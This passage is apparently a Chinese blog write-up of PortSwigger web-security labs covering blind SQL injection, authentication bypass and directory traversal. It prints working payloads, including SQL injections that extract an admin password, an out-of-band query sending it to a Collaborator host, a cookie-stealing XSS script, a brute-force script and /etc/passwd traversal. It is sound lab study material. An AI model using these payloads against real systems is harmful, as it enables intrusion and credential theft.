<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121222002194.png" alt="image-20221121222002194"></p>
<p>从这两个测试我们可以发现，可以利用条件逻辑来进行盲注</p>
<p>第一个判断 1=1 是否为真，真，所以跳转到<code>to_char(1/0)</code>  从而引起报错</p>
<p>第二个判断 1=2 是否为真，假，所以跳转到 NULL  又因为页面不会特定回显，所以正常页面</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)||&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>这样我们就可以通过查询来判断信息是否正确，如果语句正确 则会由于to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>)返回错误</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121230200553.png" alt="image-20221121230200553"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>admin<span class="string">&#x27;)||&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>反之，如果字段名不存在，则不会返回错误</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121230415084.png" alt="image-20221121230415084"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT CASE WHEN (length(password)&gt;19) THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)||&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121230655337.png" alt="image-20221121230655337"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT CASE WHEN (length(password)&gt;20) THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)||&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121230757699.png" alt="image-20221121230757699"></p>
<p>因此可以判断出password长度为20</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT CASE WHEN (substr(password,§1§,1)=&#x27;</span>§a§<span class="string">&#x27;) THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)||&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121231858248.png" alt="image-20221121231858248"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121231737538.png" alt="image-20221121231737538"></p>
<p>可以成功爆出来</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121231919373.png" alt="image-20221121231919373"></p>
<h3 id="About-11-amp-12"><a href="#About-11-amp-12" class="headerlink" title="About  11&amp;12"></a>About  11&amp;12</h3><p>测试显示  其实用11的方法，并不会在12中有什么异常显示，而是皆正常显示界面，也不会又错误</p>
<h3 id="13-Blind-SQL-injection-with-time-delays-时间盲注"><a href="#13-Blind-SQL-injection-with-time-delays-时间盲注" class="headerlink" title="13.Blind SQL injection with time delays  时间盲注"></a>13.Blind SQL injection with time delays  时间盲注</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221122205948324.png" alt="image-20221122205948324"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">’<span class="operator">||</span>pg_sleep(<span class="number">10</span>)<span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>这种数据库没学过 PostgreSQL 不过可以在官方cheat sheet中找到</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221122205725822.png" alt="image-20221122205725822"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221122205752621.png" alt="image-20221122205752621"></p>
<h3 id="14-具有时间延迟和信息检索的盲-SQL-注入"><a href="#14-具有时间延迟和信息检索的盲-SQL-注入" class="headerlink" title="14. 具有时间延迟和信息检索的盲 SQL 注入"></a>14. 具有时间延迟和信息检索的盲 SQL 注入</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221122212451341.png" alt="image-20221122212451341"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</span></span><br><span class="line"><span class="string">//成功sleep十秒</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="comment">--</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>不会sleep</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;%3BSELECT+CASE+WHEN+(length(password)&gt;19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--  //延时</span></span><br><span class="line"><span class="string">&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(length(password)<span class="operator">&gt;</span><span class="number">20</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users<span class="comment">--	//不延时</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221122214627320.png" alt="image-20221122214627320"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221122215723264.png" alt="image-20221122215723264"></p>
<h3 id="15-Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval具有时间延迟和信息检索的盲-SQL-注入"><a href="#15-Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval具有时间延迟和信息检索的盲-SQL-注入" class="headerlink" title="15.Lab: Blind SQL injection with time delays and information retrieval具有时间延迟和信息检索的盲 SQL 注入"></a>15.Lab: Blind SQL injection with time delays and information retrieval具有时间延迟和信息检索的盲 SQL 注入</h3><p>先测一下哪个sleep语句可以使其时间延迟</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205110030372.png" alt="image-20221205110030372"></p>
<p>测一下基于布尔型的时间注入</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205105855126.png" alt="image-20221205105855126"></p>
<p>判断 username为administrator 并且 password的长度大于10    最终可以测出在19和20时会又明显间断</p>
<p>  证明password的字段长度为20<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205153014509.png" alt="image-20221205153014509"></p>
<p>可以进行密码的爆破了  添加payload</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205153405075.png" alt="image-20221205153405075"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205172408438.png" alt="image-20221205172408438"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205172351735.png" alt="image-20221205172351735"></p>
<h3 id="16-OOB（Out-of-Band）带外通信注入"><a href="#16-OOB（Out-of-Band）带外通信注入" class="headerlink" title="16.OOB（Out-of-Band）带外通信注入"></a>16.OOB（Out-of-Band）带外通信注入</h3><p>907om2ygpiql3v2h19al9xovsmyem3.burpcollaborator.net</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//BURP-COLLABORATOR-SUBDOMAIN/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br></pre></td></tr></table></figure>



<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205201325690.png" alt="image-20221205201325690"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205201218385.png" alt="image-20221205201218385"></p>
<h3 id="17-带外数据渗漏的-SQL-盲注"><a href="#17-带外数据渗漏的-SQL-盲注" class="headerlink" title="17.带外数据渗漏的 SQL 盲注"></a>17.带外数据渗漏的 SQL 盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//&#x27;||(select password from users where username=&#x27;administrator&#x27;)||&#x27;d4isq62ktmup7z6l5depd1szwq2jq8.burpcollaborator.net/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205202055192.png" alt="image-20221205202055192"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205201930750.png" alt="image-20221205201930750"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205202033680.png" alt="image-20221205202033680"></p>
<h3 id="18-通过-XML-编码绕过过滤器的-SQL-注入"><a href="#18-通过-XML-编码绕过过滤器的-SQL-注入" class="headerlink" title="18.通过 XML 编码绕过过滤器的 SQL 注入"></a>18.通过 XML 编码绕过过滤器的 SQL 注入</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205202247514.png" alt="image-20221205202247514"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205204025572.png" alt="image-20221205204025572"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205203952650.png" alt="image-20221205203952650"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205203830321.png" alt="image-20221205203830321"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221205203920883.png" alt="image-20221205203920883"></p>
<h1 id="身份验证漏洞"><a href="#身份验证漏洞" class="headerlink" title="身份验证漏洞"></a>身份验证漏洞</h1><p>Authentication vulnerabilities</p>
<h2 id="身份验证机制中的漏洞"><a href="#身份验证机制中的漏洞" class="headerlink" title="身份验证机制中的漏洞"></a>身份验证机制中的漏洞</h2><h3 id="基于密码登录的漏洞"><a href="#基于密码登录的漏洞" class="headerlink" title="基于密码登录的漏洞"></a>基于密码登录的漏洞</h3><h5 id="Username-enumeration-via-response-timing"><a href="#Username-enumeration-via-response-timing" class="headerlink" title="Username enumeration via response timing"></a>Username enumeration via response timing</h5><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230126165933560.png" alt="image-20230126165933560"></p>
<p>题目相当于已经给了我们测试用例，利用wiener:peter进行测试，可以发现：</p>
<ul>
<li><p>利用burp进行基础爆破用户名和密码，我们发现网站回显已经进行了请求限制g</p>
<p>即：如果您进行过多次无效登录尝试，您的 IP 将被阻止</p>
</li>
<li><p>当您输入有效的用户名（您自己的用户名）时，响应时间会根据您输入的密码长度而增加</p>
</li>
</ul>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230126182352277.png" alt="image-20230126182352277"></p>
<p>解决方法：确定 <code>X-Forwarded-For</code>支持标头，它允许您欺骗您的 IP 地址并绕过<strong>基于 IP 的暴力保护</strong>。</p>
<p>利用添加payload的方法不断更新xff头，就可以实现欺骗IP和绕过IP保护进行暴力破解辣<br>先进行用户名的锁定：<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230126190414379.png" alt="image-20230126190414379"></p>
<p>然后我们可以通过响应的时间来判断用户名正确与否，响应时间最长的最有可能是正确的</p>
<p>然后我们利用这个用户名进行密码的测试<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230126190556975.png" alt="image-20230126190556975"></p>
<p>最后我们就可以通过状态码来判断密码的对错了<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230126190711738.png" alt="image-20230126190711738"></p>
<h5 id="绕过失败限制"><a href="#绕过失败限制" class="headerlink" title="绕过失败限制"></a>绕过失败限制</h5><p>有时您可能会发现，如果您多次登录失败，您的 IP 会被封禁。  在某些实现中，如果 IP 所有者成功登录，则失败尝试次数的计数器会重置。  这意味着攻击者只需每隔几次尝试就必须登录到自己的帐户，以防止达到此限制。</p>
<p>在这种情况下，仅在整个单词列表中定期包含您自己的登录凭据就足以使这种防御几乎无用。   </p>
<p>登录错误多了之后会等待<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230126195321121.png" alt="image-20230126195321121">      </p>
<p>解决方法就是在中间插入我们正确的用户名和密码</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230218130255891.png" alt="image-20230218130255891"></p>
<p>下面这是密码<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230218130243656.png" alt="image-20230218130243656"></p>
<p>然后将并发数设置为1 以便intruder能够按顺序进行请求爆破</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230218130359438.png" alt="image-20230218130359438"></p>
<p>看到burp官方建议可以用插件turbo intruder进行测试</p>
<p>尝试了一下，下面是修改后类似于pitchfork的攻击代码（python2）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queueRequests</span>(<span class="params">target, wordlists</span>):</span></span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">                           concurrentConnections=<span class="number">10</span>,</span><br><span class="line">                           requestsPerConnection=<span class="number">1</span>,</span><br><span class="line">                           pipeline=<span class="literal">False</span></span><br><span class="line">                           )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;F:\ctftools\\brute\dic\\carlos.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;F:\ctftools\\brute\dic\\test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">            <span class="keyword">for</span> user,word <span class="keyword">in</span> <span class="built_in">zip</span>(f1.readlines(),f2.readlines()):</span><br><span class="line">                engine.queue(target.req, [quote(user.rstrip()),quote(word.rstrip())])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleResponse</span>(<span class="params">req, interesting</span>):</span></span><br><span class="line">    <span class="comment"># currently available attributes are req.status, req.wordcount, req.length and req.response</span></span><br><span class="line">    <span class="keyword">if</span> req.status == <span class="number">302</span>:</span><br><span class="line">        table.add(req)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要注意的在图中已标注：</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230218142112847.png" alt="image-20230218142112847"></p>
<p>经过尝试 效率确实比直接intruder快一点  但相比于调试代码时间有点不值</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230218141845446.png" alt="image-20230218141845446"></p>
<p>通过账户锁定枚举用户名</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230218232548333.png" alt="image-20230218232548333"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230218233214417.png" alt="image-20230218233214417"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230218233254915.png" alt="image-20230218233254915"></p>
<h5 id="每个请求多个凭据"><a href="#每个请求多个凭据" class="headerlink" title="每个请求多个凭据"></a>每个请求多个凭据</h5><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230218234533670.png" alt="image-20230218234533670"></p>
<p>通过json传输数据 可以用数组来绕过</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230218234609322.png" alt="image-20230218234609322"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230218234435108.png" alt="image-20230218234435108"></p>
<h3 id="多重身份验证中的漏洞"><a href="#多重身份验证中的漏洞" class="headerlink" title="多重身份验证中的漏洞"></a>多重身份验证中的漏洞</h3><p>多重身份验证，即除了用户输入密码以外，还有其他因素用于进行身份验证（例如电子邮箱）<br>对于大多数网站来说，验证生物识别因素是不切实际的。   然而，基于 <strong>你所知道</strong> 的和 <strong>你拥有</strong> 的东西，强制和可选的双因素身份验证 (2FA) 越来越普遍。   这通常需要用户从他们拥有的带外物理设备中输入传统密码和临时验证码。</p>
<h5 id="2FA破环逻辑"><a href="#2FA破环逻辑" class="headerlink" title="2FA破环逻辑"></a>2FA破环逻辑</h5><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230219230544507.png" alt="image-20230219230544507"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230219230637729.png" alt="image-20230219230637729"></p>
<h5 id="使用暴力攻击绕过2FA"><a href="#使用暴力攻击绕过2FA" class="headerlink" title="使用暴力攻击绕过2FA"></a>使用暴力攻击绕过2FA</h5><p>通过测试可以发现当我们输入错误的验证码两次之后系统会将登录账号注销</p>
<p>burpsuite推荐使用宏或者是turbo Intruder插件完成  </p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230220091226915.png" alt="image-20230220091226915"></p>
<p>学习一下如何录制宏</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230220093346615.png" alt="image-20230220093346615"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230220093423613.png" alt="image-20230220093423613"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230220093552829.png" alt="image-20230220093552829"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230220093644366.png" alt="image-20230220093644366"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230220095033153.png" alt="image-20230220095033153"></p>
<p>点击测试宏 能够看到正常的响应就说明没问题了</p>
<p>然后我们将另一个携带验证码的请求包 也就是 <code>POST /login2</code>的包发至intruder 设置好payload 正常爆破验证码</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230220095252025.png" alt="image-20230220095252025"></p>
<p>将并发量改为1</p>
<h3 id="其他身份验证机制中的漏洞"><a href="#其他身份验证机制中的漏洞" class="headerlink" title="其他身份验证机制中的漏洞"></a>其他身份验证机制中的漏洞</h3><h4 id="保持用户登录"><a href="#保持用户登录" class="headerlink" title="保持用户登录"></a>保持用户登录</h4><h5 id="保持登录的cookie"><a href="#保持登录的cookie" class="headerlink" title="保持登录的cookie"></a>保持登录的cookie</h5><p>抓包发现请求中有一个名为stay-logged-in的cookie<br><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230220205202244.png" alt="image-20230220205202244"></p>
<p>base64解密后：<code>wiener:51dc30ddc473d43a6011e9ebba6ca770</code><br>然后md5之后发现这就是用户密码<code>peter</code></p>
<p>发现规律之后直接进行受害用户的cookie伪造<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230220210120570.png" alt="image-20230220210120570"></p>
<h5 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h5><p>利用xss存储型在评论区中插入恶意代码，从而使carlos用户在登录访问之后获得他的stay-logged-cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221191437769.png"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221191223083.png" alt="image-20230221191223083"></p>
<p>按要求删除用户</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221191558227.png" alt="image-20230221191558227"></p>
<h4 id="重置用户密码"><a href="#重置用户密码" class="headerlink" title="重置用户密码"></a>重置用户密码</h4><h5 id="使用url重置密码"><a href="#使用url重置密码" class="headerlink" title="使用url重置密码"></a>使用url重置密码</h5><p>1.重置破坏逻辑</p>
<p>某些网站在提交重置表单时也无法再次验证令牌。  在这种情况下，攻击者可以简单地从他们自己的帐户访问重置表单，删除令牌，并利用此页面重置任意用户的密码。         </p>
<p>虽然在发邮箱的时候存在<code>temp-forgot-password-token</code>进行身份验证<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221195512911.png" alt="image-20230221195512911"></p>
<p>但将最后修改输入新密码的包抓下来  直接修改用户名发现没有验证   直接就可以修改所改用户的密码了</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221195509291.png" alt="image-20230221195509291"></p>
<p>2.通过中间件进行密码重置中毒</p>
<p>如果重置电子邮件中的 URL 是动态生成的，这也可能容易受到密码重置中毒的影响。  在这种情况下，攻击者可能会窃取另一个用户的令牌并使用它来更改他们的密码。</p>
<p>先登录我们自己的账号 修改密码发现网站使用token进行修改密码的身份认证</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221221001464.png" alt="image-20230221221001464"></p>
<p>环境模拟carlos用户会点击邮件  我们利用漏洞利用服务进行日志的记录</p>
<blockquote>
<p><code>X-Forwarded-Host</code>（XFH）报头是用于识别由客户机在所要求的原始主机一个事实上的标准报头<code>Host</code>的 HTTP 请求报头。</p>
<p>反向代理（负载均衡器，CDN）的主机名称和端口可能与处理请求的源服务器不同，在这种情况下，<code>X-Forwarded-Host</code>头部可用于确定最初使用哪个主机。</p>
</blockquote>
<p>通过修改XFH头  让漏洞利用服务器记录carlos用户点击的日志  得到用户的身份认证token</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221221446295.png" alt="image-20230221221446295"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221221205182.png" alt="image-20230221221205182"></p>
<p>然后更改carlos用户密码 使用得到的用户token</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221221554862.png" alt="image-20230221221554862"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221220915826.png" alt="image-20230221220915826"></p>
<h4 id="通过更改密码暴力破解密码"><a href="#通过更改密码暴力破解密码" class="headerlink" title="通过更改密码暴力破解密码"></a>通过更改密码暴力破解密码</h4><p>环境的目的就是获得密码，所有的信息都为获得密码服务</p>
<p>我们可以通过尝试发现，当三个信息都不同时会报一个类型的错误</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221232500352.png" alt="image-20230221232500352"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221232315256.png" alt="image-20230221232315256"></p>
<p>当密码正确时，报错是另一个类型的<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221232711428.png" alt="image-20230221232711428"></p>
<p>因此就可以验证密码的正确性了</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221232747602.png" alt="image-20230221232747602"></p>
<p>报文中没有验证身份信息的token  直接抓包改用户名，添加payload</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221233009189.png" alt="image-20230221233009189"></p>
<p>完成</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230221233115061.png" alt="image-20230221233115061"></p>
<h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><h2 id="简单案例"><a href="#简单案例" class="headerlink" title="简单案例"></a>简单案例</h2><p>读取etc/passwd文件</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222145952500.png" alt="image-20230222145952500"></p>
<h2 id="利用文件路径遍历漏洞的常见障碍"><a href="#利用文件路径遍历漏洞的常见障碍" class="headerlink" title="利用文件路径遍历漏洞的常见障碍"></a>利用文件路径遍历漏洞的常见障碍</h2><h3 id="利用绝对路径绕过对返回上级目录符的禁用"><a href="#利用绝对路径绕过对返回上级目录符的禁用" class="headerlink" title="利用绝对路径绕过对返回上级目录符的禁用"></a>利用绝对路径绕过对返回上级目录符的禁用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222175407010.png" alt="image-20230222175407010"></p>
<h3 id="嵌套遍历序列绕过单次消除目录遍历"><a href="#嵌套遍历序列绕过单次消除目录遍历" class="headerlink" title="嵌套遍历序列绕过单次消除目录遍历"></a>嵌套遍历序列绕过单次消除目录遍历</h3><p>将<code>../</code>过滤去除了  我们利用双写 <code>....//</code>  这样就只去掉一个 然后剩下的还是<code>../</code></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222180457480.png"></p>
